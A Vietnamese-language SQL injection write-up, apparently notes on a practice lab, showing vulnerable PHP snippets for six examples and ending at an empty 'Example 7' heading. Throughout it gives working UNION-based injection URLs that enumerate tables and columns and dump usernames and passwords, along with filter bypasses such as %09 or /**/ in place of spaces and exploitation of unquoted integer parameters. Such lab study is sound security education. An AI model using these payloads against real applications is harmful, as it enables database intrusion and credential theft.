# SQL INJECTION SOLUTION

## Một số kiến thức cần biết
```sh
--	:	MySQL Linux Style
--+	:	MySQL Windows Style
#	:	Hash (URL encode while use)
--+-	:	SQL Comment
;%00	:	Null Byte
`	:	Backtick
```

- union có tác dụng kết nối các truy vấn đầu vào, và có truy vấn đó đều xuất ra một cột

- limit dùng để đặt giới hạn và truy vấn vào từng cột : 

- concat dùng để gom lấy lun một nhóm: concat(username,0x3a,password)

- Với lượng dữ liệu lớn ta sẽ dùng: `select group_concat(username,0x3a,password,0x0a)from (select username,password from users limit 0,100)`; ( Chứng năng group_concat chỉ có giới hạn trong 1024 kí tự)

- Ta có thể dùng CAST để tăng buffer lên: `SELECT CAST(GROUP_CONCAT(username,0x3a,password,0x0a) AS CHAR(2048)) FROM users;`

- Một số varialbe/function có thể đưọc khai thác
```sh
Variable/Function		Output
@@hostname	:	Current Hostname
@@tmpdir	:	Tept Directory
@@datadir	:	Data Directory
@@version	:	Version of DB
@@basedir	:	Base Directory
user()	:	Current User
database()	:	Current Database
version()	:	Version
schema()	:	current Database
UUID()	:	System UUID key
current_user()	:	Current User
current_user	:	Current User
system_user()	:	Current Sustem user
session_user()	:	Session user
@@GLOBAL.have_symlink	:	Check if Symlink Enabled or Disabled
@@GLOBAL.have_ssl	:	Check if it have ssl or not
```
```sh
Query : Select table_name from information_schema.talbes where table_schema='databasename'

Query for Current DB: Select table_name from information_schema.tables where table_schema=database()

Injection : http://fakesite.com/report.php?id=-23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database()--+
```




## Example1
-----------------------------------------------------------------------------

Code review:
```sh
<?php
.... ...
$sql = "SELECT * FROM users where name='";
$sql .= $_GET["name"]."'";   
$result = mysql_query($sql);
.... ...
?>
```

- Truy vấn đầu vào name=' or 1=1-- -
- Lưu ý với comment `--` thường gây ra vấn đề nếu sau nó không có khoảng trắng

- Truy xuất tên các cột: `http://192.168.215.149/sqli/example1.php?name=root' union select 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='tablename' or 1=1-- -`

- Truy xuất các thông tin khai thác được từng cái một với LIMIT: `http://192.168.215.149/sqli/example1.php?name=root' union select 1,(select concat(name,0x3a,groupid,0x3a,passwd) from users limit 3,1),3,4,5 or 1=1-- -`

- Truy xuất một lần ra hết: `http://192.168.215.149/sqli/example1.php?name=root' union select 1,(select group_concat(name,0x3a,0x3a,passwd) from users),3,4,5 or 1=1-- -`
---------------------------------------------------------------------------------------

## Example2
--------------------------------------------------------------------------------------------

Code review:
```sh
<?php
... ..
if (preg_match('//',$_GET["name"])){
	die("ERROR NO SPACE");
}
$sql="SELECT * From users  where name='";
 $sql .= $_GET["name"]."'";

  $result = mysql_query($sql);


?>

- Khi truy vấn với khoảng trắng sẽ báo lỗi

- Tuy nhiên ta có thể thay thế khoảng trắng với các kĩ tự như /**/ or TAB/HT(%09, URL encoded) để bypass

- Truy xuất số cột: `http://192.168.215.149/sqli/example2.php?name=root%27%09union%09select%091,2,3,4,5%09or%091=1--%09-`

- Tương tự như trên Example1 nhưng thay thế khoảng trắng đi
---------------------------------------------------------------------------------------------
## Example3
-----------------------------------------------------------------------------------

code review:
```sh
<?php
... ..
if (preg_match('/\s+/',$_GET["name"])){
	die("ERROR NO SPACE");
}
$sql="SELECT * FROM users where name='";
$sql .= $_GET["name"]."'";
$result = mysql_query($sql);
... ..
?>
```
- Bằng cách sử dụng [PCRE regex(|s+)](http://php.net/manual/en/regexp.reference.escape.php) đã ngăn ta sử dụng các kí tự khoảng trắng hay TAB/HT. Nhưng ta có thể dùng /**/ để thay thế

- Tương tự như 2 example trên

---------------------------------------------------------------------------------

## Example4

code review:
```sh
<?php
... ...
$sql="SELECT * FROM users where id=";
$sql.=mysql_real_escape_string($_GET["id"])." ";
$result= mysql_query($sql);
... ...
?>
```
- [mysql_real_escape_string](http://php.net/manual/en/function.mysql-real-escape-string.php) dùng để ngăn chặn các sql injection bằng các kí tự `\x00, \n, \r, \, '," and \x1a`

-Tuy nhiên trong trường hợp này 'id' được dùng như một số tích hợp mà không được trích dẫn từ `'`, nên nó vẫn có thiể bị khai thác bởi sql injection

- Truy xuất table_name: `http://192.168.215.149/sqli/example4.php?id=2 union select 1,table_name,3,4,5 from information_schema.tables where table_schema=database() limit 1,1--+`

- Truy xuất column_name: `http://192.168.215.149/sqli/example4.php?id=2 union select 1,column_name,3,4,5 from information_schema.columns where table_schema=database() limit 0,6--+`

- Truy xuất password: `http://192.168.215.149/sqli/example4.php?id=2 union select 1,concat(name,0x3a,passwd),3,4,5 from users limit 0,6--+`

------------------------------------------------------------------------------------------------------------------

## Example 5
code review:
```sh
<?php
    ... ...
  if (!preg_match('/^[0-9]+/', $_GET["id"])) {
      die("ERROR INTEGER REQUIRED");   
  }
  $sql = "SELECT * FROM users where id=";
  $sql .= $_GET["id"] ;
  
  $result = mysql_query($sql);
  ... ...
?>
```

- Code này chỉ đảm bảo id phải là số tự nhiên nhưng mọi thứ có thể đi sau nó

- Việc truy xuất tương tự example4

----------------------------------------------------------------------------------------------------------------------

## Example 6
code review:
```sh
<?php
    ... ...
  if (!preg_match('/[0-9]+$/', $_GET["id"])) {
      die("ERROR INTEGER REQUIRED");   
  }
  $sql = "SELECT * FROM users where id=";
  $sql .= $_GET["id"] ;

  $result = mysql_query($sql);
  ... ...
?>
```	

- Code này đảm bảo chắc chắn id phải là một số tích hợp. Nhưng ta vẫn có thể sql injection nó 

- Truy xuất dữ liệu: `http://192.168.215.149/sqli/example6.php?id=2 union select 1,concat(name,0x3a,passwd),3,4,5 from users limit 0,6`

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Example 7

